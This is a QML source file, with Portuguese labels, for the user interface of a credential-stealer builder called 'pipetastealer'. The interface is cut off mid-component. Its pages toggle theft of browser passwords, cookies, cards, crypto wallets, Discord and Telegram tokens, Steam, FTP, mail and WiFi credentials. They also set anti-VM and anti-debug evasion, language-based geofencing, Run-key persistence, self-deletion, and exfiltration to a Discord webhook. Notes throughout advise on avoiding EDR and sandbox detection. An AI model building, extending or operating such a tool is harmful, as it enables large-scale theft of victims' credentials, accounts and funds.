import QtQuick
import QtQuick.Controls
import QtQuick.Controls.Basic
import QtQuick.Layouts

// ============================================================
//  pwnd.blog palette — fonte unica de verdade
//  bg #050505 · surface #0d0d0d · line #1a1a1a · text #d1d5db
//  dim #6b7280 · accent #d946ef · accentSoft #e879f9
//  ok #22c55e · err #ef4444 · mono: JetBrains Mono
// ============================================================

ApplicationWindow {
    id: window

    visible: true
    width: 1180
    height: 840
    minimumWidth: 900
    minimumHeight: 620
    title: "pipetastealer · builder"
    color: "#050505"

    property int pageIndex: 0
    property var pageComponents: [dashPage, coletaPage, stealthPage, geofencePage,
                                  persistenciaPage, grabberPage, blocklistPage, exfilPage]

    // tom do status: roxo compilando, verde ok, vermelho falha, cinza ocioso
    readonly property color statusTone: backend.building ? "#e879f9"
                                        : backend.status.indexOf("ok") === 0 ? "#22c55e"
                                        : backend.status.indexOf("falha") === 0 ? "#ef4444"
                                        : "#6b7280"

    function pageTitle() {
        return navModel.get(window.pageIndex).title
    }

    ListModel {
        id: navModel
        ListElement { title: "dashboard"; sub: "visao geral + build" }
        ListElement { title: "coleta"; sub: "credenciais e arquivos" }
        ListElement { title: "stealth"; sub: "evasao e opsec" }
        ListElement { title: "geofence"; sub: "filtro por regiao" }
        ListElement { title: "persistencia"; sub: "sobrevivencia no host" }
        ListElement { title: "file grabber"; sub: "alvos e extensoes" }
        ListElement { title: "blocklist"; sub: "processos barrados" }
        ListElement { title: "exfiltracao"; sub: "webhook de saida" }
    }

    ColumnLayout {
        anchors.fill: parent
        spacing: 0

        // ================= HEADER =================
        Rectangle {
            id: topBar
            Layout.fillWidth: true
            implicitHeight: 58
            color: "#0a0a0a"

            Rectangle {
                anchors.left: parent.left
                anchors.right: parent.right
                anchors.bottom: parent.bottom
                height: 1
                color: "#1a1a1a"
            }

            Rectangle {
                id: progressLine
                visible: backend.building
                anchors.left: parent.left
                anchors.bottom: parent.bottom
                height: 2
                width: topBar.width * 0.22
                color: "#d946ef"
                SequentialAnimation on x {
                    running: backend.building
                    loops: Animation.Infinite
                    NumberAnimation { from: -progressLine.width; to: topBar.width; duration: 900 }
                }
            }

            RowLayout {
                anchors.fill: parent
                anchors.leftMargin: 16
                anchors.rightMargin: 16
                spacing: 12

                Rectangle {
                    Layout.alignment: Qt.AlignVCenter
                    implicitWidth: 30
                    implicitHeight: 30
                    radius: 8
                    color: Qt.rgba(0.851, 0.275, 0.937, 0.14)
                    border.width: 1
                    border.color: Qt.rgba(0.851, 0.275, 0.937, 0.45)
                    Label {
                        anchors.centerIn: parent
                        text: "PT"
                        color: "#e879f9"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 12
                        font.bold: true
                    }
                }

                ColumnLayout {
                    spacing: 0
                    Label {
                        text: "pipetastealer"
                        color: "#e879f9"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 14
                        font.bold: true
                        font.letterSpacing: 0.6
                    }
                    Label {
                        text: "builder"
                        color: "#6b7280"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 9
                        font.letterSpacing: 1.8
                        font.capitalization: Font.AllUppercase
                    }
                }

                Rectangle {
                    Layout.alignment: Qt.AlignVCenter
                    implicitWidth: 1
                    implicitHeight: 26
                    color: "#1a1a1a"
                }

                ColumnLayout {
                    spacing: 0
                    Layout.fillWidth: true
                    Label {
                        text: window.pageTitle()
                        color: "#d1d5db"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 12
                        font.bold: true
                    }
                    Label {
                        text: backend.projeto
                        color: "#6b7280"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 9
                        elide: Text.ElideMiddle
                        Layout.fillWidth: true
                    }
                }

                Rectangle {
                    Layout.alignment: Qt.AlignVCenter
                    implicitWidth: statusRow.implicitWidth + 22
                    implicitHeight: 28
                    radius: 7
                    color: "#0d0d0d"
                    border.width: 1
                    border.color: "#1a1a1a"

                    RowLayout {
                        id: statusRow
                        anchors.centerIn: parent
                        spacing: 8
                        Rectangle {
                            Layout.alignment: Qt.AlignVCenter
                            implicitWidth: 7
                            implicitHeight: 7
                            radius: 4
                            color: window.statusTone
                        }
                        Label {
                            text: backend.status
                            color: "#d1d5db"
                            font.family: "JetBrains Mono"
                            font.pixelSize: 11
                        }
                    }
                }

                ActionButton {
                    Layout.alignment: Qt.AlignVCenter
                    label: backend.building ? "compilando"
                                            : backend.build_count > 0 && !backend.last_build_ok ? "tentar de novo"
                                            : backend.build_count > 0 ? "compilar de novo"
                                            : "compilar"
                    fill: backend.building ? "#141414" : "#d946ef"
                    fg: backend.building ? "#6b7280" : "#050505"
                    enabled: !backend.building
                    onClicked: backend.build()
                }
            }
        }

        // ================= BODY =================
        RowLayout {
            Layout.fillWidth: true
            Layout.fillHeight: true
            spacing: 0

            // ---------- NAV ----------
            Rectangle {
                Layout.preferredWidth: 216
                Layout.fillHeight: true
                color: "#080808"

                Rectangle {
                    anchors.right: parent.right
                    anchors.top: parent.top
                    anchors.bottom: parent.bottom
                    width: 1
                    color: "#1a1a1a"
                }

                ColumnLayout {
                    anchors.fill: parent
                    anchors.margins: 12
                    spacing: 3

                    Label {
                        text: "configuracao"
                        color: "#4b4b53"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 9
                        font.letterSpacing: 1.8
                        font.capitalization: Font.AllUppercase
                        Layout.leftMargin: 4
                        Layout.bottomMargin: 6
                    }

                    Repeater {
                        model: navModel
                        delegate: NavRow {
                            title: model.title
                            code: (index + 1 < 10 ? "0" : "") + (index + 1)
                            active: window.pageIndex === index
                            onPicked: (index) => window.pageIndex = index
                        }
                    }

                    Item { Layout.fillHeight: true }

                    Rectangle {
                        Layout.fillWidth: true
                        implicitHeight: 1
                        color: "#1a1a1a"
                        Layout.topMargin: 8
                        Layout.bottomMargin: 8
                    }

                    MetaRow { label: "target"; value: backend.target }
                    MetaRow { label: "optimize"; value: backend.optimize }
                    MetaRow {
                        label: "ultimo build"
                        value: backend.build_count === 0 ? "nunca"
                             : backend.last_build_size_kb + " KB · " + (backend.last_build_ms / 1000).toFixed(1) + "s"
                        tone: backend.build_count === 0 ? "#6b7280"
                            : backend.last_build_ok ? "#22c55e" : "#ef4444"
                    }
                }
            }

            // ---------- PAGES ----------
            ScrollView {
                id: pageScroll
                Layout.fillWidth: true
                Layout.fillHeight: true
                clip: true
                contentWidth: availableWidth

                contentHeight: pageLoader.item ? pageLoader.item.implicitHeight : 0

                ScrollBar.horizontal.policy: ScrollBar.AlwaysOff
                ScrollBar.vertical: ScrollBar {
                    id: pageBar
                    policy: ScrollBar.AsNeeded
                    implicitWidth: 9
                    background: Rectangle { color: "transparent" }
                    contentItem: Rectangle {
                        implicitWidth: 4
                        radius: 2
                        color: pageBar.pressed ? "#d946ef" : "#242424"
                    }
                }

                Loader {
                    id: pageLoader
                    width: pageScroll.availableWidth - 32
                    x: 16
                    sourceComponent: window.pageComponents[window.pageIndex]
                }
            }
        }

        // ================= STATUS BAR =================
        Rectangle {
            Layout.fillWidth: true
            implicitHeight: 26
            color: "#0a0a0a"

            Rectangle {
                anchors.left: parent.left
                anchors.right: parent.right
                anchors.top: parent.top
                height: 1
                color: "#1a1a1a"
            }

            RowLayout {
                anchors.fill: parent
                anchors.leftMargin: 16
                anchors.rightMargin: 16
                spacing: 14

                Label {
                    text: backend.building ? "compilando com zig build…" : "pronto"
                    color: window.statusTone
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                }

                Item { Layout.fillWidth: true }

                Label {
                    text: "modulos ativos " + (backend.coleta_ativos + backend.stealth_ativos + backend.persistencia_ativos)
                          + "/" + (backend.coleta_total + backend.stealth_total + backend.persistencia_total)
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                }

                Rectangle { implicitWidth: 1; implicitHeight: 12; color: "#1a1a1a" }

                Label {
                    text: backend.target + " · " + backend.optimize
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                }

                Rectangle { implicitWidth: 1; implicitHeight: 12; color: "#1a1a1a" }

                Label {
                    text: backend.toolchain
                    color: backend.toolchain_ok ? "#6b7280" : "#ef4444"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                }
            }
        }
    }

    // ==========================================================
    //  PAGINAS
    // ==========================================================

    // ---------- 01 DASHBOARD ----------
    Component {
        id: dashPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 14

            RowLayout {
                Layout.fillWidth: true
                spacing: 12

                StatCard {
                    label: "modulos coleta"
                    value: backend.coleta_ativos + "/" + backend.coleta_total
                    sub: "credenciais, sessoes e arquivos"
                    accent: "#d946ef"
                    progress: backend.coleta_ativos / backend.coleta_total
                }
                StatCard {
                    label: "stealth"
                    value: backend.stealth_ativos + "/" + backend.stealth_total
                    sub: "evasao ligada"
                    accent: "#e879f9"
                    progress: backend.stealth_ativos / backend.stealth_total
                }
                StatCard {
                    label: "persistencia"
                    value: backend.persistencia_ativos === 0 ? "off" : backend.persistencia_ativos + "/" + backend.persistencia_total
                    sub: backend.persistencia_ativos === 0 ? "execucao unica" : "sobrevive a reboot"
                    accent: backend.persistencia_ativos === 0 ? "#6b7280" : "#22c55e"
                    progress: backend.persistencia_ativos / backend.persistencia_total
                }
                StatCard {
                    label: "geofence"
                    value: backend.geofence_langids_total === 0 ? "off" : backend.geofence_langids_total + " langids"
                    sub: backend.geofence_langids_total === 0 ? "roda em qualquer regiao" : backend.geofence
                    accent: backend.geofence_langids_total === 0 ? "#6b7280" : "#e879f9"
                    progress: Math.min(1, backend.geofence_langids_total / 9)
                }
            }

            Card {
                title: "modulos ativos"
                hint: "o que entra no exe"
                badge: (backend.coleta_ativos + backend.stealth_ativos + backend.persistencia_ativos)
                       + "/" + (backend.coleta_total + backend.stealth_total + backend.persistencia_total) + " ligados"

                Flow {
                    Layout.fillWidth: true
                    Layout.preferredHeight: implicitHeight
                    spacing: 6

                    Repeater {
                        model: backend.modulos
                        delegate: Chip {
                            label: modelData.nome
                            on: modelData.on
                            accent: modelData.grupo === "coleta" ? "#d946ef"
                                  : modelData.grupo === "stealth" ? "#e879f9"
                                  : "#22c55e"
                        }
                    }
                }
            }

            Card {
                title: "build"
                hint: "gera src/ajuste.zig e compila"
                badge: backend.build_count === 0 ? "nunca compilado" : "build #" + backend.build_count

                RowLayout {
                    Layout.fillWidth: true
                    spacing: 16

                    ColumnLayout {
                        Layout.fillWidth: true
                        Layout.minimumWidth: 0
                        spacing: 6
                        FieldLabel { text: "optimize" }
                        Segmented {
                            Layout.fillWidth: true
                            options: ["Debug", "ReleaseFast", "ReleaseSmall"]
                            current: Math.max(0, ["Debug", "ReleaseFast", "ReleaseSmall"].indexOf(backend.optimize))
                            onPicked: (index) => backend.optimize = options[index]
                        }
                    }

                    ColumnLayout {
                        Layout.fillWidth: true
                        Layout.minimumWidth: 0
                        spacing: 6
                        FieldLabel { text: "target" }
                        Segmented {
                            Layout.fillWidth: true
                            options: ["x86_64-windows-gnu", "x86-windows-msvc"]
                            current: Math.max(0, ["x86_64-windows-gnu", "x86-windows-msvc"].indexOf(backend.target))
                            onPicked: (index) => backend.target = options[index]
                        }
                    }
                }

                RowLayout {
                    Layout.fillWidth: true
                    Layout.topMargin: 2
                    spacing: 10

                    MiniStat { label: "tamanho"; value: backend.last_build_size_kb > 0 ? backend.last_build_size_kb + " KB" : "—" }
                    MiniStat { label: "tempo"; value: backend.last_build_ms > 0 ? (backend.last_build_ms / 1000).toFixed(1) + "s" : "—" }
                    MiniStat { label: "hora"; value: backend.last_build_when }
                    MiniStat {
                        label: "status"
                        value: backend.build_count === 0 ? "—" : backend.last_build_ok ? "ok" : "falha"
                        tone: backend.build_count === 0 ? "#6b7280" : backend.last_build_ok ? "#22c55e" : "#ef4444"
                    }
                }

                ActionButton {
                    Layout.fillWidth: true
                    Layout.preferredHeight: 42
                    Layout.topMargin: 2
                    label: backend.building ? "compilando…" : "compilar"
                    fill: backend.building ? "#141414" : "#d946ef"
                    fg: backend.building ? "#6b7280" : "#050505"
                    enabled: !backend.building
                    onClicked: backend.build()
                }
            }

            RowLayout {
                Layout.fillWidth: true
                spacing: 14

                Card {
                    title: "console"
                    hint: "zig build em tempo real"
                    badge: backend.building ? "rodando"
                         : backend.output.length === 0 ? "vazio"
                         : (backend.output.split("\n").length - 1) + " linhas"

                    Layout.preferredWidth: 3
                    Layout.horizontalStretchFactor: 3

                    Flickable {
                        id: consoleFlick
                        Layout.fillWidth: true
                        Layout.preferredHeight: 160
                        clip: true
                        contentWidth: width
                        contentHeight: consoleArea.height

                        TextArea {
                            id: consoleArea
                            width: consoleFlick.width
                            height: Math.max(consoleFlick.height, contentHeight + 20)
                            text: backend.output
                            readOnly: true
                            selectByMouse: true
                            wrapMode: TextArea.NoWrap
                            font.family: "JetBrains Mono"
                            font.pixelSize: 11
                            color: "#22c55e"
                            placeholderText: "$ aguardando build…"
                            placeholderTextColor: "#4b4b53"
                            padding: 10
                            background: Rectangle {
                                color: "#080808"
                                radius: 8
                                border.width: 1
                                border.color: "#1a1a1a"
                            }

                            onTextChanged: consoleFlick.contentY = Math.max(0, consoleFlick.contentHeight - consoleFlick.height)
                        }
                    }
                }

                Card {
                    title: "saida"
                    hint: "artefato gerado"
                    badge: backend.last_build_ok ? backend.last_build_size_kb + " KB" : ""

                    Layout.preferredWidth: 2
                    Layout.horizontalStretchFactor: 2

                    Label {
                        Layout.fillWidth: true
                        text: backend.exe_path
                        color: "#d1d5db"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 10
                        wrapMode: Text.WrapAnywhere
                    }

                    Rectangle {
                        Layout.fillWidth: true
                        implicitHeight: 1
                        color: "#1a1a1a"
                    }

                    KeyValue { label: "ajuste.zig"; value: backend.geofence_langids_total + " langids · " + backend.extensoes_total + " extensoes" }
                    KeyValue { label: "file grabber"; value: backend.pegador_arquivos ? backend.tamanho_max_arquivo + " MB por arquivo" : "desligado" }
                    KeyValue { label: "blocklist"; value: backend.blocklist_total + " processos" }
                    KeyValue { label: "webhook"; value: backend.webhook_ok ? "configurado" : "placeholder"; tone: backend.webhook_ok ? "#22c55e" : "#ef4444" }

                    Item { Layout.fillHeight: true }
                }
            }

            Card {
                title: "ajuste.zig"
                hint: "config injetada no binario"
                badge: "src/ajuste.zig"
                collapsible: true
                open: false

                Flickable {
                    id: previewFlick
                    Layout.fillWidth: true
                    Layout.preferredHeight: 150
                    clip: true
                    contentWidth: width
                    contentHeight: previewArea.height

                    TextArea {
                        id: previewArea
                        width: previewFlick.width
                        height: Math.max(previewFlick.height, contentHeight + 20)
                        text: backend.ajuste_preview
                        readOnly: true
                        selectByMouse: true
                        wrapMode: TextArea.NoWrap
                        font.family: "JetBrains Mono"
                        font.pixelSize: 11
                        color: "#9ca3af"
                        padding: 10
                        background: Rectangle {
                            color: "#080808"
                            radius: 8
                            border.width: 1
                            border.color: "#1a1a1a"
                        }
                    }
                }
            }
        }
    }

    // ---------- 02 COLETA ----------
    Component {
        id: coletaPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 14

            Card {
                title: "coleta"
                hint: "o que sai da maquina do alvo"
                badge: backend.coleta_ativos + "/" + backend.coleta_total

                GridLayout {
                    Layout.fillWidth: true
                    columns: window.width > 1000 ? 2 : 1
                    columnSpacing: 16
                    rowSpacing: 2

                    ToggleRow { title: "Navegadores"; sub: "senhas, cookies, cartoes, historico"
                                on: backend.roubar_navegadores; onToggled: (state) => backend.roubar_navegadores = state }
                    ToggleRow { title: "Carteiras crypto"; sub: "12 extensoes + 8 desktop"
                                on: backend.roubar_crypto; onToggled: (state) => backend.roubar_crypto = state }
                    ToggleRow { title: "Discord"; sub: "tokens plaintext + DPAPI"
                                on: backend.roubar_discord; onToggled: (state) => backend.roubar_discord = state }
                    ToggleRow { title: "Telegram"; sub: "tdata"
                                on: backend.roubar_telegram; onToggled: (state) => backend.roubar_telegram = state }
                    ToggleRow { title: "Steam"; sub: "ssfn + config + registry"
                                on: backend.roubar_steam; onToggled: (state) => backend.roubar_steam = state }
                    ToggleRow { title: "FileZilla"; sub: "credenciais FTP"
                                on: backend.roubar_filezilla; onToggled: (state) => backend.roubar_filezilla = state }
                    ToggleRow { title: "Outlook"; sub: "Windows Credential Manager"
                                on: backend.roubar_outlook; onToggled: (state) => backend.roubar_outlook = state }
                    ToggleRow { title: "Thunderbird"; sub: "NSS"
                                on: backend.roubar_thunderbird; onToggled: (state) => backend.roubar_thunderbird = state }
                    ToggleRow { title: "WiFi"; sub: "perfis + senhas"
                                on: backend.roubar_wifi; onToggled: (state) => backend.roubar_wifi = state }
                    ToggleRow { title: "File Grabber"; sub: "varredura recursiva"
                                on: backend.pegador_arquivos; onToggled: (state) => backend.pegador_arquivos = state }
                    ToggleRow { title: "Screenshot"; sub: "JPEG via GDI+"
                                on: backend.tirar_captura; onToggled: (state) => backend.tirar_captura = state }
                    ToggleRow { title: "System info"; sub: "OS, CPU, RAM, IP"
                                on: backend.coletar_info_sistema; onToggled: (state) => backend.coletar_info_sistema = state }
                }
            }

            Note {
                tone: "#e879f9"
                text: "cada modulo desligado tambem some do ajuste.zig — o codigo morto nao vai pro binario, mas a superficie de deteccao reduz junto."
            }
        }
    }

    // ---------- 03 STEALTH ----------
    Component {
        id: stealthPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 14

            Card {
                title: "stealth & evasion"
                hint: "tentativa de passar por maquina real"
                badge: backend.stealth_ativos + "/" + backend.stealth_total

                GridLayout {
                    Layout.fillWidth: true
                    columns: window.width > 1000 ? 2 : 1
                    columnSpacing: 16
                    rowSpacing: 2

                    ToggleRow { title: "Anti-VM"; sub: "CPUID + MAC + DLL de sandbox + sleep skew"
                                on: backend.anti_vm; onToggled: (state) => backend.anti_vm = state }
                    ToggleRow { title: "Anti-debug"; sub: "PEB + rdtsc + CheckRemoteDebugger"
                                on: backend.anti_debug; onToggled: (state) => backend.anti_debug = state }
                    ToggleRow { title: "Human interaction"; sub: "mouse + teclado"
                                on: backend.human_interaction; onToggled: (state) => backend.human_interaction = state }
                    ToggleRow { title: "Indirect syscalls"; sub: "gadget no ntdll"
                                on: backend.indirect_syscalls; onToggled: (state) => backend.indirect_syscalls = state }
                    ToggleRow { title: "API hashing"; sub: "FNV-1a, zero nomes em claro"
                                on: backend.api_hashing; onToggled: (state) => backend.api_hashing = state }
                    ToggleRow { title: "Stack strings"; sub: "descriptografa na stack"
                                on: backend.stack_strings; onToggled: (state) => backend.stack_strings = state }
                }
            }

            Note {
                tone: "#e879f9"
                text: "com tudo ligado o binario fica maior e mais lento no cold start. anti-VM costuma ser o primeiro a cair em sandbox de cliente."
            }
        }
    }

    // ---------- 04 GEOFENCE ----------
    Component {
        id: geofencePage
        ColumnLayout {
            width: pageLoader.width
            spacing: 14

            Card {
                title: "geofence"
                hint: "aborta se o idioma do host nao bater"
                badge: backend.geofence_custom.trim() !== "" ? "custom override ativo"
                     : backend.geofence_langids_total === 0 ? "desligado"
                     : backend.geofence_langids_total + " langids"

                GridLayout {
                    Layout.fillWidth: true
                    columns: window.width > 1000 ? 2 : 1
                    columnSpacing: 16
                    rowSpacing: 8
                    enabled: backend.geofence_custom.trim() === ""
                    opacity: backend.geofence_custom.trim() === "" ? 1 : 0.45
                    Behavior on opacity { NumberAnimation { duration: 140 } }

                    OptionCard { label: "none"; sub: "roda em qualquer host"; selected: backend.geofence === "none"
                                 onPicked: () => backend.geofence = "none" }
                    OptionCard { label: "cis"; sub: "RU / UA / BY"; selected: backend.geofence === "cis"
                                 onPicked: () => backend.geofence = "cis" }
                    OptionCard { label: "asia"; sub: "CN / KP / JP"; selected: backend.geofence === "asia"
                                 onPicked: () => backend.geofence = "asia" }
                    OptionCard { label: "middle_east"; sub: "IR / IQ / SY"; selected: backend.geofence === "middle_east"
                                 onPicked: () => backend.geofence = "middle_east" }
                    OptionCard { label: "all_except_western"; sub: "todos os presets juntos"; selected: backend.geofence === "all_except_western"
                                 Layout.columnSpan: window.width > 1000 ? 2 : 1
                                 onPicked: () => backend.geofence = "all_except_western" }
                }

                Rectangle {
                    Layout.fillWidth: true
                    implicitHeight: 1
                    color: "#1a1a1a"
                }

                FieldLabel { text: "langids efetivos" }
                Label {
                    Layout.fillWidth: true
                    text: backend.geofence_langids_label
                    color: backend.geofence_langids_total === 0 ? "#6b7280" : "#d1d5db"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 11
                    wrapMode: Text.WrapAnywhere
                }

                FieldLabel { text: "langids custom (sobrepoe o preset)" }
                InputBox {
                    Layout.fillWidth: true
                    value: backend.geofence_custom
                    placeholder: "0x0419,0x0422,0x0423"
                    onEdited: (text) => backend.geofence_custom = text
                }
            }

            Note {
                tone: backend.geofence_custom.trim() !== "" ? "#ef4444" : "#e879f9"
                text: backend.geofence_custom.trim() !== ""
                      ? "custom override ativo: a selecao de regiao acima esta sendo ignorada — o ajuste.zig vai com os langids digitados."
                      : "langid custom vazio usa o preset. preenchido, ele ignora a selecao acima — confira o resultado antes de compilar."
            }
        }
    }

    // ---------- 05 PERSISTENCIA ----------
    Component {
        id: persistenciaPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 14

            Card {
                title: "persistencia"
                hint: "o que acontece depois do primeiro run"
                badge: backend.persistencia_ativos + "/" + backend.persistencia_total

                ColumnLayout {
                    Layout.fillWidth: true
                    spacing: 2

                    ToggleRow { title: "HKCU Run key"; sub: "sobe junto com o login do usuario"
                                on: backend.persistir; onToggled: (state) => backend.persistir = state }
                    ToggleRow { title: "Self-delete"; sub: "rename-and-reopen, some do disco"
                                on: backend.auto_destruir; onToggled: (state) => backend.auto_destruir = state }
                }
            }

            Note {
                tone: backend.persistir ? "#ef4444" : "#6b7280"
                text: backend.persistir
                      ? "run key ligada: o binario fica residente e vira IOC permanente no host — mais chance de EDR pegar em re-scan."
                      : "sem persistencia o binario roda uma vez e morre. menor pegada, menos reincidencia."
            }
        }
    }

    // ---------- 06 FILE GRABBER ----------
    Component {
        id: grabberPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 14

            Card {
                title: "file grabber"
                hint: "varredura de arquivos por extensao"
                badge: backend.pegador_arquivos ? "ligado" : "desligado"

                RowLayout {
                    Layout.fillWidth: true
                    spacing: 12

                    FieldLabel { text: "limite por arquivo"; Layout.alignment: Qt.AlignVCenter }

                    Stepper {
                        value: backend.tamanho_max_arquivo
                        from: 1
                        to: 50
                        suffix: " MB"
                        onStepped: (v) => backend.tamanho_max_arquivo = v
                    }

                    Item { Layout.fillWidth: true }
                }

                FieldLabel { text: "caminhos varridos" }
                InputBox {
                    Layout.fillWidth: true
                    value: backend.caminhos_pegador
                    placeholder: "Desktop,Documents,Downloads"
                    onEdited: (text) => backend.caminhos_pegador = text
                }

                FieldLabel { text: "extensoes  ·  " + backend.extensoes_total + " alvos" }
                InputArea {
                    Layout.fillWidth: true
                    Layout.preferredHeight: 96
                    value: backend.extensoes_arquivo
                    onEdited: (text) => backend.extensoes_arquivo = text
                }
            }

            Note {
                tone: "#e879f9"
                text: "a lista de extensoes e caminhos sai ofuscada (XOR) no binario — nao aparece em strings do exe."
            }
        }
    }

    // ---------- 07 BLOCKLIST ----------
    Component {
        id: blocklistPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 14

            Card {
                title: "process blocklist"
                hint: "aborta se algum destes estiver rodando"
                badge: backend.blocklist_total + " processos"

                FieldLabel { text: "um nome por linha" }
                InputArea {
                    Layout.fillWidth: true
                    Layout.preferredHeight: 300
                    value: backend.process_blocklist
                    onEdited: (text) => backend.process_blocklist = text
                }
            }
        }
    }

    // ---------- 08 EXFILTRACAO ----------
    Component {
        id: exfilPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 14

            Card {
                title: "exfiltracao"
                hint: "destino do que foi coletado"
                badge: backend.webhook_ok ? "configurado" : "placeholder"

                FieldLabel { text: "webhook url" }
                InputBox {
                    Layout.fillWidth: true
                    value: backend.webhook_url
                    placeholder: "https://discord.com/api/webhooks/…"
                    onEdited: (text) => backend.webhook_url = text
                }

                Rectangle {
                    Layout.fillWidth: true
                    implicitHeight: 42
                    radius: 8
                    color: backend.webhook_ok ? Qt.rgba(0.133, 0.773, 0.369, 0.08) : Qt.rgba(0.937, 0.267, 0.267, 0.08)
                    border.width: 1
                    border.color: backend.webhook_ok ? Qt.rgba(0.133, 0.773, 0.369, 0.35) : Qt.rgba(0.937, 0.267, 0.267, 0.35)

                    RowLayout {
                        anchors.fill: parent
                        anchors.leftMargin: 12
                        anchors.rightMargin: 12
                        spacing: 8

                        Rectangle {
                            Layout.alignment: Qt.AlignVCenter
                            implicitWidth: 7
                            implicitHeight: 7
                            radius: 4
                            color: backend.webhook_ok ? "#22c55e" : "#ef4444"
                        }
                        Label {
                            Layout.fillWidth: true
                            text: backend.webhook_ok
                                  ? "endpoint pronto: host e path vao pro ajuste.zig"
                                  : "url ainda e o placeholder — troque antes de compilar"
                            color: backend.webhook_ok ? "#22c55e" : "#ef4444"
                            font.family: "JetBrains Mono"
                            font.pixelSize: 11
                            elide: Text.ElideRight
                        }
                    }
                }

                Label {
                    Layout.fillWidth: true
                    text: "host: " + backend.webhook_host + "   ·   path: " + backend.webhook_path
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                    elide: Text.ElideMiddle
                }
            }

            Note {
                tone: "#e879f9"
                text: "o payload sai em chunks multipart pro mesmo webhook. discord derruba em burst longo — se for volume alto, divide entre dois hooks."
            }
        }
    }

    // ==========================================================
    //  COMPONENTES
    // ==========================================================

    component Card : Rectangle {
        id: card
        property string title: ""
        property string hint: ""
        property string badge: ""
        property color accent: "#d946ef"
        property bool collapsible: false
        property bool open: true
        default property alias body: bodyCol.data

        Layout.fillWidth: true
        implicitHeight: col.implicitHeight + 30
        color: "#0d0d0d"
        radius: 10
        border.width: 1
        border.color: "#1a1a1a"

        ColumnLayout {
            id: col
            anchors.left: parent.left
            anchors.right: parent.right
            anchors.top: parent.top
            anchors.margins: 15
            spacing: 12

            RowLayout {
                Layout.fillWidth: true
                spacing: 9
                visible: card.title !== ""

                Rectangle {
                    Layout.alignment: Qt.AlignVCenter
                    implicitWidth: 3
                    implicitHeight: 13
                    radius: 2
                    color: card.accent
                }
                Label {
                    text: card.title
                    color: "#e879f9"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 11
                    font.bold: true
                    font.letterSpacing: 1.5
                    font.capitalization: Font.AllUppercase
                }
                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    text: card.hint
                    color: "#4b4b53"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                    elide: Text.ElideRight
                }
                Label {
                    text: card.badge
                    visible: card.badge !== ""
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                }
                Label {
                    text: card.open ? "−" : "+"
                    visible: card.collapsible
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 13
                }

                HoverHandler {
                    enabled: card.collapsible
                    cursorShape: Qt.PointingHandCursor
                }
                TapHandler {
                    enabled: card.collapsible
                    onTapped: card.open = !card.open
                }
            }

            ColumnLayout {
                id: bodyCol
                Layout.fillWidth: true
                spacing: 10
                visible: card.open
            }
        }
    }

    component StatCard : Rectangle {
        id: stat
        property string label: ""
        property string value: ""
        property string sub: ""
        property color accent: "#d946ef"
        property real progress: -1

        Layout.fillWidth: true
        implicitHeight: 96
        radius: 10
        color: "#0d0d0d"
        border.width: 1
        border.color: "#1a1a1a"

        ColumnLayout {
            anchors.fill: parent
            anchors.margins: 14
            spacing: 3

            Label {
                text: stat.label
                color: "#6b7280"
                font.family: "JetBrains Mono"
                font.pixelSize: 9
                font.letterSpacing: 1.4
                font.capitalization: Font.AllUppercase
            }
            Label {
                text: stat.value
                color: stat.accent
                font.family: "JetBrains Mono"
                font.pixelSize: 25
                font.bold: true
            }
            Label {
                Layout.fillWidth: true
                Layout.minimumWidth: 0
                text: stat.sub
                color: "#6b7280"
                font.family: "JetBrains Mono"
                font.pixelSize: 10
                elide: Text.ElideRight
            }
            Item { Layout.fillHeight: true }
            Rectangle {
                Layout.fillWidth: true
                implicitHeight: 3
                radius: 2
                color: "#1a1a1a"
                visible: stat.progress >= 0
                Rectangle {
                    height: parent.height
                    radius: 2
                    color: stat.accent
                    width: parent.width * Math.max(0, Math.min(1, stat.progress))
                    Behavior on width { NumberAnimation { duration: 180 } }
                }
            }
        }
    }

    component MiniStat : Rectangle {
        property string label: ""
        property string value: "—"
        property color tone: "#d1d5db"

        Layout.fillWidth: true
        implicitHeight: 48
        radius: 8
        color: "#0a0a0a"
        border.width: 1
        border.color: "#171717"

        ColumnLayout {
            anchors.fill: parent
            anchors.margins: 10
            spacing: 1
            Label {
                text: parent.parent.label
                color: "#4b4b53"
                font.family: "JetBrains Mono"
                font.pixelSize: 9
                font.letterSpacing: 1.2
                font.capitalization: Font.AllUppercase
                elide: Text.ElideRight
            }
            Label {
                Layout.fillWidth: true
                Layout.minimumWidth: 0
                text: parent.parent.value
                color: parent.parent.tone
                font.family: "JetBrains Mono"
                font.pixelSize: 14
                font.bold: true
                elide: Text.ElideRight
            }
        }
    }

    component KeyValue : RowLayout {
        property string label: ""
        property string value: ""
        property color tone: "#d1d5db"

        Layout.fillWidth: true
        spacing: 8

        Label {
            text: parent.label
            color: "#6b7280"
            font.family: "JetBrains Mono"
            font.pixelSize: 10
        }
        Label {
            Layout.fillWidth: true
            Layout.minimumWidth: 0
            text: parent.value
            color: parent.tone
            font.family: "JetBrains Mono"
            font.pixelSize: 10
            horizontalAlignment: Text.AlignRight
            elide: Text.ElideRight
        }
    }

    component MetaRow : RowLayout {
        property string label: ""
        property string value: ""
        property color tone: "#6b7280"

        Layout.fillWidth: true
